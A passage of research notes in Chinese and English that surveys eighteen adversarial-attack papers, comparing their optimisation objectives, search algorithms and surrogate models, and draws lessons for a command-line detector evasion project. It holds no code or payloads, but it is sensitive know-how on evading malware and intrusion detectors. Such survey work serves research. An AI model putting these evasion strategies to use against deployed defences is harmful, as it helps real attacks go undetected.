   f(x') ≠ f(x) = y

optimization (Eq 2):
   x* = argmax_{x'} Sim(x, x')
   s.t.  f(x') ≠ f(x)

Sim(·, ·) = USE 语义相似度
x = [w_1, w_2, ..., w_n]               (原句, 词序列)
x' = [w'_1, w'_2, ..., w'_n]           (扰动句)
替换候选 w'_i ∈ S(w_i)                  (counter-fitted word emb 同义词集)

hard-label setting: attacker 只能拿 f(x') ∈ {classes}, 不拿 confidence
```

### 优化问题总结

正式 max-min optimization:**最大化扰动句跟原句的语义相似度 Sim(x, x'),subject to 扰动句必须仍能 fool target(f(x') ≠ f(x))**。hard-label setting — attacker 只能拿 0/1 分类结果,不拿 confidence。候选限定在 counter-fitted word embedding 同义词集 S(w_i)。

### 奖励函数(原文)

**Eq 1(adversarial condition):** `f(x') ≠ f(x) = y`

**Eq 2(主目标):** `x* = argmax_{x'} Sim(x, x'), s.t. f(x') ≠ f(x)`

**Eq 3(substitute back 选词):**
```
w_* = argmax_{w_i ∈ x} Sim(x, x'_t(w_i)) · C(f, x, x'_t(w_i))
```

**Eq 4(adversarial 保持约束 C):**
```
C(f, x, x'_t(w_i)) = { 1   if f(x) ≠ f(x'_t(w_i))   (仍能 fool)
                    { 0   if f(x) = f(x'_t(w_i))    (失败)
```

**Eq 5(优化顺序的 cosine 距离):** `d_i = 1 - cos(v_{w_i}, v_{w'_i})`

**Eq 7(transition word):**
```
w̄_i = argmax_{w_i^(j) ∈ R} Sim(x, x'_t(w_i^(j))) · C(f, x, x'_t(w_i^(j)))
R = {w_i^(1), ..., w_i^(r)} 随机从同义词集 S(w_i) 选 r 个
```

**Eq 8(updating direction):**
```
u = Σ_{j=1}^k α_j (v_{w_i^(j)} - v_{w̄_i})
α_j = (s^(j) - s̄_i) / Σ |s^(l) - s̄_i|
s^(j) = Sim(x, x'_t(w̄_i^(j)))   (语义相似度)
```

### 奖励函数总结

**hard-label 设定:attacker 只能拿 0/1 答案,拿不到 confidence。**

两阶段思路:① **Substitute back**:之前为了攻击成功改了一堆词,现在试着**把改过的词替换回原词**,只要 target 还输出错的(C=1),就替回去。逐个替,直到再替就翻车了为止。这一步缩小扰动量。② **Transition word optimization**:剩下仍要改的词,用 word embedding 方向估计 — 在同义词集里随机抽 k 个候选,看哪些候选能让语义相似度提升,**按"语义提升量"加权平均**这些候选方向(Eq 8),得到"该往哪个方向改"的向量 u,然后选 word emb 最接近 u 的同义词。

整体:**(a) "能 fool" 是硬约束 C;(b) 语义相似度 Sim 是主目标**。属于"(a) 决定通过性 + (b) 作主排序"模式(类 4)— 跟 TextFooler 同思路。


### 搜索算法(原文)

§4.4:"HQA-Attack first gets the initial adversarial example by random initialization. Then it enters into the main loop. In each iteration, HQA-Attack first substitutes original words back, then determines the optimizing order, and finally updates the adversarial example sequentially";§4.3.2:"we update the adversarial example with the following steps. (1) Finding the transition word; (2) Estimating the updating direction; (3) Updating the adversarial example."

### 搜索算法总结

两阶段迭代式启发搜索(查询高效的贪心-坐标式 hill-climbing):随机初始化 → 交替进行(A)原词回填降低扰动率 +(B)按重要度顺序、用过渡词 + 加权梯度方向逐词更新。非 GA / 非反向传播。

### Fitness(原文)

Eq. (3):`w_* = argmax_{w_i ∈ x} Sim(x, x'_t(w_i)) · C(f, x, x'_t(w_i))`;Eq. (4):`C(f, x, x'_t(w_i)) = 1 if f(x) ≠ f(x'_t(w_i)); 0 otherwise`;Eq. (8) 更新方向:`u = Σ α_j (v_{w'^{(j)}_i} − v_{w̄_i})`,α_j ∝ sim 差值。

### Fitness 总结

标量 fitness = Sim(x,x') × C(f,·) 对抗指示(必须维持 f(x')≠f(x) 才有效);方向估计用语义相似度差作权重对采样邻居方向加权。

### 替代模型(原文)

§3 Problem Formulation Table 1:"f: the victim model";所有 f(·)、C(f,·) 直接调用 victim。"For hard-label methods, they only need to know the predicted labels of the victim model"。

### 替代模型总结

**原文无 surrogate model**,直接 query victim 取 hard-label,用语义相似度采样估方向。

---

## 18. TextHoaxer (Ye et al. AAAI'22)

### 优化问题方程(原文)

**Eq 5(§3):**
```
minimize    L(P) = λ_1·ℓ_sim(P) + λ_2·ℓ_pwp(P) + λ_3·ℓ_spa(P)
over        P ∈ ℝ^{n×m}                  (扰动矩阵, n 个位置 × m 维 embedding)

subject to:
   f(x') ≠ f(x)                          (adversarial 保持, hard-label)

三项 loss:
   ℓ_sim(P) = -sim(x, x')                    (Eq 2, 语义相似度 loss)
   ℓ_pwp(P) = Σ_{i=1}^n ||p_i||_2^2          (Eq 3, pair-wise perturbation)
                p_i = v_{w'_i} - v_{w_i}
   ℓ_spa(P) = Σ_{i=1}^n |γ_i|                (Eq 4, sparsity)
                p_i = γ_i · ρ_i (magnitude × direction)

参数: λ_1 = 1, λ_2 = λ_3 = 0.1
hard-label setting + tight budget (B ≤ 1000 queries)
```

### 优化问题总结

正式 unconstrained gradient optimization(在连续 embedding 空间):**最小化加权 loss L = λ_1·ℓ_sim + λ_2·ℓ_pwp + λ_3·ℓ_spa**,subject to f(x') ≠ f(x)(每次更新后 verify)。决策变量是扰动矩阵 P ∈ ℝ^{n×m}(n 个位置 × m 维 embedding)。三项 loss 分别管:语义相似度、扰动幅度、稀疏性。

hard-label + 紧 budget 设定(query ≤ 1000)。最终把连续 P 映射回离散词(找 word emb 最近的同义词)。

### 奖励函数(原文)

**Eq 2(semantic similarity loss):**
```
ℓ_sim(P) = -sim(x, x'),  s.t. f(x') ≠ f(x)
```

**Eq 3(pair-wise perturbation constraint):**
```
ℓ_pwp(P) = Σ_{i=1}^n ||p_i||_2^2
P = [p_1, ..., p_n], p_i = v_{w'_i} - v_{w_i} (替换词 - 原词的 embedding 差)
```

**Eq 4(sparsity constraint):**
```
ℓ_spa(P) = Σ_{i=1}^n |γ_i|
p_i = γ_i · ρ_i (magnitude × direction)
```

**Eq 5(final loss):**
```
min_P  L = λ_1·ℓ_sim + λ_2·ℓ_pwp + λ_3·ℓ_spa
s.t.   f(x') ≠ f(x)
```

参数: `λ_1=1, λ_2=λ_3=0.1`

### 奖励函数总结

**hard-label + 紧 budget(query 数 ≤ 1000)的极简优化:在 word embedding 连续空间上对"扰动矩阵 P"做梯度下降。**

P 是个 n×m 矩阵,每行 `p_i = v_{w'_i} - v_{w_i}`(替换词 - 原词的 embedding 差向量)。Loss 三项加权:① **ℓ_sim = -sim(x, x')** 扰动后整句跟原句的语义相似度,取负让 minimize 等价 maximize sim ② **ℓ_pwp = Σ ‖p_i‖²** 每对"原词-替换词"在 embedding 空间的距离平方和(成对扰动约束:每对替换都不能离原词太远)③ **ℓ_spa = Σ |γ_i|** 每个 p_i 拆成 magnitude × direction,L1 罚 magnitude → 让大部分位置 γ_i ≈ 0(不改)。

`min L = λ_1·ℓ_sim + λ_2·ℓ_pwp + λ_3·ℓ_spa`,硬约束:`f(x') ≠ f(x)`(还得 fool target)。属于"加权融合"模式(类 6)— 三个 loss 项加权求和成单 scalar 优化。最终连续 P 映射回离散词(找 word emb 最接近 p_i 的同义词)。


### 搜索算法(原文)

§Optimization Procedure:"we need to estimate their solutions by firstly optimizing ρ_i's with fixed γ_i's, and in turn, optimizing γ_i's with fixed ρ_i's. Suppose that we optimize them by an iterative process in T steps";Eq. (6-8):`V = P + βU = [v_1,…,v_n]^T … g^{(t)}_i = − (sim(x, v'_t) − sim(x, x'_t))/β · u_i … p_i ← p_i − η_1(g^{(t)}_i + 2λ_2 p_i)`。

### 搜索算法总结

单候选连续空间的交替优化(零阶梯度估计 + 软阈值 sparse 更新):在词嵌入扰动矩阵 P=[γ_i ρ_i] 上交替做方向 ρ_i 的零阶梯度下降 + 幅度 γ_i 的近端软阈值,每步映射回最近同义词得离散对抗样本。

### Fitness(原文)

Eq. (5):`min_P L = min_P λ_1 ℓ_sim + λ_2 ℓ_pwp + λ_3 ℓ_spa, s.t. f(x') ≠ f(x)`;零阶梯度估计 Eq. (7):`g^{(t)}_i = −(sim(x, v'_t) − sim(x, x'_t))/β · u_i`。

### Fitness 总结

标量 fitness = λ_1·(−USE 相似度) + λ_2·成对嵌入扰动 L2 + λ_3·magnitude L1 稀疏项,在 f(x')≠f(x) 约束下最小化。

### 替代模型(原文)

§Problem Formulation:"the black-box victim model f only outputs the discrete predicted label ŷ = f(x')";梯度来自 sim(·,·)(USE)在扰动矩阵上的零阶估计。

### 替代模型总结

**原文无 detector surrogate**,直接 query victim 取 hard-label;sim(·,·) 是 USE 句向量编码器(语义相似度度量),非替代分类器。

---

## 优化问题归纳(基于 18 篇已核对论文)

按**原文 formal optimization 的结构**分类。每篇只出现一次,按类型组织。

### 类型 A:min 扰动量 s.t. 攻击成功 + budget

公式 pattern:`min |perturbation| s.t. 攻击成功 + 预算`

| 论文 | 决策变量 | 公式(原文) | 关键约束 |
|---|---|---|---|
| Discrete-Block BO(Eq 1)| s' | `min d_Hamming(s, s')` | CW margin ≥ 0;C(w_i) 预筛 |
| EvadeDroid(Eq 1)| δ | `min |δ|` | f(φ(T_δ(z))) ≠ f(φ(z));q ≤ Q;c ≤ α |
| HQA-Attack(Eq 2)| x' | `argmax Sim(x, x')`(等价 min 距离)| f(x') ≠ f(x) |

### 类型 B:max 攻击信号 s.t. 约束

公式 pattern:`max attack_score s.t. validity/budget`

| 论文 | 决策变量 | 公式(原文) | 关键约束 |
|---|---|---|---|
| GRABNEL(Eq 1)| G' | `max ℒ_attack` (CW margin) | Δ ≤ rn²;B = 40Δ |
| Nettack(Problem 2)| (A', X') | `max ln Z*_c - ln Z*_{c_old}` (CW margin) | Λ < 0.004 度分布 + 共现 σ-test + budget Δ |
| MalGuise(Eq 1, 2)| T(变换序列)| `argmax g(z) - g(z_adv)`(w/ prob)<br>或 `argmin f(z_adv)`(w/o prob)| semantics 保持;size ≤ 5% |
| TextHoaxer(Eq 5)| P ∈ ℝ^{n×m} | `min λ_1·ℓ_sim + λ_2·ℓ_pwp + λ_3·ℓ_spa` | f(x') ≠ f(x) |

### 类型 C:多目标 Pareto

公式 pattern:`max (f_1, f_2, ..., f_k)`(NSGA-II 处理)

| 论文 | 决策变量 | 公式(原文) | 关键约束 |
|---|---|---|---|
| FCGHunter(Eq 4)| I(operator 序列)| `max (f_1, f_2)`;f_1 = M(E(G+I)), f_2 = -Σ SHAP·ΔE | §VI-B 5 个 operator constraints |

### 类型 D:可行性问题(find feasible)— 原文有显式 find s.t. 形式

公式 pattern:`find x s.t. 攻击成功 + 约束`

| 论文 | 决策变量 | 公式(原文) | 关键约束 |
|---|---|---|---|
| PWWS(Eq 1-3)| Δx | `argmax P(y_i\|x*)` 跟 G 不同 | ‖Δx‖_p < ε;WordNet 同义词限 |
| TEXTBUGGER(§II.A)| x_adv | `F(x_adv) = t`(t ≠ y) | S(x, x_adv) ≥ ε |

### 类型 E:无显式 max/min/find 方程,只有算法 + 概念定义

| 论文 | 算法 / 概念目标 | 原文有什么 |
|---|---|---|
| TextFooler | F(X_adv) ≠ Y + USE 相似度高 + 词数少 | §3 greedy 算法描述 + 4 层 filter |
| BagAmmo | F(x*) = benign + 加边数少 + R1-R4 | §3-5 文字 R1-R4 + Eq 2 threat degree |
| HRAT | Deep Q-learning(无 formal max E[Σ R])| Eq 5(substitute Obj_adv)+ Eq 7-8(reward)+ Algorithm 1 |
| AdvDroidZero | f(z*) = benign + 最小化 query 数 | §3 三条 manipulation requirements |
| ProvNinja | M(G') = benign + attack 语义保持 | §3.1 文字描述 |
| Goyal | f(G^E) ≠ malicious + T 限制 | §IV T 形式跟限制(Ẽ^A = E^A + Θ)|
| Contorter | 对每个 v_m 找 best v_c | §3.3 4-module 各自 score 函数 |
| SPECTRA | Φ_R(E(ĉ)) = FALSE + effect preserved | §2 Φ_R 条件 + §3.4.1 α/β 概念 |

---

## 奖励函数范式归纳(基于 18 篇已核对论文)

### 类 1:只 (a),仅硬约束
- **GRABNEL** — CW margin + Δ 硬上限
- **MalGuise** — confidence drop + validity + size 硬约束

### 类 2:(a) 进 fitness + (b) 作硬过滤 / 候选预筛
- **PWWS** — WordNet 同义词限候选(候选预筛)
- **Nettack** — 度分布 / 共现 硬过滤
- **Discrete-Block BO** — 候选词表 C(w_i) 预筛(word emb 语义近义,Stage 1)
- **TEXTBUGGER** — `S(x, x') ≥ ε` 句级 USE 相似度硬过滤
- **EvadeDroid** — Preparation 阶段 n-gram 相似度筛 donor benign APK(Eq 4-5)→ 限定 transformation 集 Δ;**注**:硬约束 `c ≤ α` / `q ≤ Q` 本身是 attacker budget(类 1 风格),候选预筛是 类 2 思路 → **混合**

### 类 3:(a) → Stage 1, (b) → Stage 2 串行
- **Discrete-Block BO** — Stage 1 max L,Stage 2 min Hamming
- **BagAmmo** — selection 按 T 然后 L 串行

### 类 4:(a) 决定通过性 + (b) 作主排序
- **TextFooler** — 能 fool 的候选里选 USE 相似度最高
- **HQA-Attack** — `C × Sim` 联合;C 二元(能否 fool),Sim 排序

### 类 5:(a) + (b) 双目标 Pareto(不合成)
- **FCGHunter** — NSGA-II `(f_1, f_2)`

### 类 6:加权融合(α·(a) + β·(b))
- **HRAT** — `R = 1[成功] - (扰动量)`(reward 公式直接相加,失败时只扰动罚)
- **TextHoaxer** — `L = λ_1·ℓ_sim + λ_2·ℓ_pwp + λ_3·ℓ_spa`(3 项加权融合)

### 类 7:启发式 pipeline / 无显式 fitness
- **ProvNinja** — regularity-based gadget 替代
- **Goyal** — embedding distance 驱动子结构注入
- **Contorter** — 4 模块串联过滤
- **AdvDroidZero** — 概率树自适应(隐式优化)
- **SPECTRA** — α / β 兼容度排序 + avoid set 硬约束(命令行 SIEM evasion)

---

## 搜索算法 / Fitness / 替代模型 归纳(基于 18 篇已核对论文)

### 表 A:搜索算法分类

| 算法族 | 论文 | 共性 |
|---|---|---|
| **贪婪 / 坐标爬山** | TextFooler、PWWS、TEXTBUGGER、Nettack、ProvNinja、Goyal、Contorter、HQA-Attack | 顺序枚举单步最优 op;无回溯;Nettack 在 surrogate 上贪婪,其余在 target 上 |
| **零阶梯度下降** | TextHoaxer | 连续 embedding 空间 + 有限差分梯度 + 软阈值,离散映射 |
| **遗传算法 (GA / NSGA-II)** | FCGHunter、BagAmmo | 种群 + crossover + mutation;BagAmmo 多种群协同 |
| **Bayesian Optimization** | GRABNEL、Discrete-Block BO | GP/BLR 后验 + acquisition;GRABNEL 内层 GA,BBA 内层 EI+DPP |
| **MCTS** | MalGuise | 四步迭代 + UCT 选 child |
| **Deep Q-Learning (RL)** | HRAT | Q 网络选 action type,surrogate gradient 选 action object |
| **Random Search** | EvadeDroid | 随机抽 transformation,fitness 提升即接受 |
| **概率自适应树 (Bandit-style)** | AdvDroidZero | 树结构 + 反馈调整祖先节点概率 |
| **检索 + lexicographic** | SPECTRA | 非 search-loop;exact-key 检索 + 词典序排序 |

### 表 B:Fitness 分类

| 类型 | 论文 | 公式 / 量 |
|---|---|---|
| **真类置信度下降** | TextFooler、PWWS、TEXTBUGGER | F_y(x) − F_y(x'),ΔP |
| **CW-style logit margin** | Nettack、GRABNEL、Discrete-Block BO | max_{y'≠y} logit_{y'} − logit_y |
| **目标恶意概率下降 (scalar)** | MalGuise、AdvDroidZero、EvadeDroid (soft) | g(z) − g(z_adv),Δy,g_{y=0} |
| **多目标向量** | FCGHunter (f_1, f_2)、SPECTRA J(u) lexicographic | NSGA-II / 词典序 |
| **双因子串行** | BagAmmo (T 然后 L)、HRAT (binary R + ΔN) | top-N by f_1 then f_2 |
| **加权融合** | TextHoaxer (λ_1·ℓ_sim + λ_2·ℓ_pwp + λ_3·ℓ_spa)、HQA-Attack (Sim × C) | 单 scalar |
| **相似度 / 距离驱动** | Goyal (F^δ embedding)、Contorter (cosine/Euclidean + confidence)、ProvNinja (regularity R_e)、EvadeDroid hard (n-gram s(a)) | 距离阈值终止 |

### 表 C:替代模型分类

| 类别 | 论文 | 类型 / 训练方式 |
|---|---|---|
| **有可训练 surrogate** | Nettack | 线性化 2 层 GCN softmax(Â² X W),干净图交叉熵预训 |
| | GRABNEL | WL 子树核 + Sparse Bayesian Linear Regression (ARD 先验),历史 (Φ, L) 训 |
| | Discrete-Block BO | GP + ARD categorical kernel,Adam 极大化后验估 β_i |
| | BagAmmo | GCN 判别器,以目标 F label 训(GAN 风格) |
| | HRAT | 可微 kNN 近似,Obj_adv 上反传 |
| | FCGHunter (部分) | 仅 KNN 类目标,instance-based substitute 作 fitness 代理 |
| **有 surrogate 但非神经网络** | ProvNinja | 公开 program execution frequency database (n-gram-style),Regularity R_e 替代黑盒判 rarity |
| **白盒下有,黑盒下无** | Contorter | 白盒 attacker 本地训 PIDS 替代;黑盒不能 query 验证 |
| **无 detector surrogate(直接 query target)** | TextFooler、PWWS、TEXTBUGGER、HQA-Attack、TextHoaxer、MalGuise、AdvDroidZero、EvadeDroid | 所有 fitness 信号来自真实 victim 反馈;EvadeDroid hard-label 用 n-gram 无参代理但非可训练 |
| **无 detector surrogate,有内部辅助 NLP 模型** | SPECTRA | BiLSTM-CRF + text encoder 作 rule effect 抽取(非替代分类器);evasion 由 φ_R literal 验证 |
| **无 surrogate,profile benign 分布替代** | Goyal | 直接读 audit log profile benign substructure 分布,不训替代分类器 |

### 三维度交叉:18 篇分布

| 算法 \\ 替代模型 | 有可训练 surrogate | 有非 NN surrogate | 无 surrogate |
|---|---|---|---|
| 贪婪 / 坐标爬山 | Nettack(线性 GCN) | ProvNinja(freq DB)、Contorter(白盒) | TextFooler、PWWS、TEXTBUGGER、Goyal、HQA-Attack |
| GA / NSGA-II | FCGHunter(KNN 子)、BagAmmo(GCN) | | |
| BO | GRABNEL(WL+BLR)、Discrete-Block BO(GP) | | |
| MCTS | | | MalGuise |
| RL (Q-learning) | HRAT(可微 kNN) | | |
| Random Search | | | EvadeDroid |
| Bandit 树 | | | AdvDroidZero |
| 零阶梯度 | | | TextHoaxer |
| 检索 lexicographic | | | SPECTRA |

**观察:**
- **18 篇里 7 篇有可训练 detector surrogate**(Nettack、GRABNEL、Discrete-Block BO、BagAmmo、HRAT、FCGHunter 部分、ProvNinja 用 freq DB 算半个)。这 7 篇里 GRABNEL / BO / RL / NSGA-II 全靠 surrogate 才能在紧 budget 内跑。
- **MCTS 唯一一篇(MalGuise)是无 surrogate**,leaf 直接真 query target → query 成本高,只适合 target 查询便宜的场景。
- **text-domain 5 篇全无 surrogate**(query API 便宜),provenance/cmd 域有/无 surrogate 各半(查询成本中等)。
- **对 SafeMimic-CMD 启示:** 若 query budget 紧 + leaf 真 query 贵(docker exec ~3s),则不应学 MalGuise 走 MCTS-无 surrogate 路线;应学 GRABNEL 用 surrogate driven BO 把真 query 用在外层,内层在 surrogate 上廉价探索。

---

## 对 SafeMimic-CMD Phase B 的启示

**(a) 我们已有:** detector reply = dict[node → score],continuous CW-style 信号天然在。

**(b) 候选 proxy(基于 15 篇经验):**
| 类型 | 代表论文 | 我们可对应 |
|---|---|---|
| 距离 / 编辑距离 | Discrete-Block BO, HRAT | 编辑距离 \|Δ\| / Hamming |
| 语义相似度 | TextFooler, TEXTBUGGER, AdATCM | USE-style,我们无直接对应 |
| 候选预筛 | PWWS, TextFooler, Discrete-Block BO | P_benign 候选池 |
| Reference 比较 | Goyal, Contorter, FCGHunter(SHAP)| **k-NN to R_unflagged**(§5.2 U)|
| 硬约束 | GRABNEL, Nettack, EvadeDroid, MalGuise | budget B 上限,partial order |

**Reward 合成路线候选:**
| 类 | 适合 | 不适合 |
|---|---|---|
| 类 2 (b) 硬约束 | BO 友好,清晰 | (b) 退化 0/1 |
| 类 3 串行两 stage | BO/GA 都 OK | 不能同时优化 |
| 类 4 (b) 主排序 | 适合 greedy | 不适合 BO |
| 类 5 Pareto | Professor 倾向 | 跟 BO 范式冲突 |
| 类 6 加权 | 简单可解释 | 超参 α/β 难调 |
| 类 7 启发式 | 容易实现 | 没数学保证 |

---

## 引用论文(全部核对原文)

| 论文 | 出处 | 本地 PDF / 链接 | 核对状态 |
|---|---|---|---|
| TextFooler (Jin et al.) | AAAI'20 | arxiv.org/abs/1907.11932 | ✓ 已核对 |
| PWWS (Ren et al.) | ACL'19 | aclanthology.org/P19-1103 | ✓ 已核对 |
| TEXTBUGGER (Li et al.) | NDSS'19 | local `reference_paper/TEXTBUGGER...pdf` | ✓ 已核对 |
| FCGHunter (Sen Chen et al.) | TSE'25 | local `FCGHunter_*.pdf` | ✓ 已核对 |
| Nettack (Zugner et al.) | KDD'18 | local `Adversarial Attacks on Neural Networks for Graph Data.pdf` | ✓ 已核对 |
| Discrete-Block BO (Lee et al.) | ICML'22 | arxiv.org/abs/2206.08575 | ✓ 已核对 |
| GRABNEL (Wan et al.) | NeurIPS'21 | local `NeurIPS-2021-*.pdf` | ✓ 已核对 |
| MalGuise (Ling et al.) | USENIX Sec'24 | local `MalGuise_USENIX24.pdf` | ✓ 已核对 |
| BagAmmo (Tang et al.) | USENIX Sec'23 | local `BagAmmo.pdf` | ✓ 已核对 |
| HRAT (Zhao et al.) | CCS'21 | local `HRAT_CCS21.pdf` | ✓ 已核对 |
| EvadeDroid (Bostani et al.) | CnS'24 | local `EvadeDroid_CnS24.pdf` | ✓ 已核对 |
| AdvDroidZero (He et al.) | CCS'23 | local `AdvDroidZero_CCS23.pdf` | ✓ 已核对 |
| ProvNinja (Mukherjee et al.) | USENIX Sec'23 | local `ProvNinja_USENIX23.pdf` | ✓ 已核对 |
| Goyal (Goyal et al.) | NDSS'23 | local `Goyal_NDSS23.pdf` | ✓ 已核对 |
| Contorter (Nasr et al.) | S&P'26 | local `contorter_sp26.pdf` | ✓ 已核对 |
| SPECTRA (Shoaib et al.) | local | local `spectra.pdf` | ✓ 已核对 |
| HQA-Attack (Liu et al.) | NeurIPS'23 | local `HQA-Attack_NeurIPS23.pdf`(已下载) | ✓ 已核对 |
| TextHoaxer (Ye et al.) | AAAI'22 | local `TextHoaxer_AAAI22.pdf`(已下载) | ✓ 已核对 |
